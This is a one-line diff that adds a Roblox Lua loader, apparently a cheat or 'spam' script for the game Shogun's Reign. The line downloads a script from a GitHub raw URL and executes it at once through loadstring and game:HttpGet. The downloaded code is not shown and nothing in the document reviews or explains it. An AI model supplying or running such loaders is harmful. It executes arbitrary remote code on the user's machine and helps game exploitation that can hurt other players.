@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/shogun-s-reign-spam6-2s9p7xg1ifc5dp.lua"))()
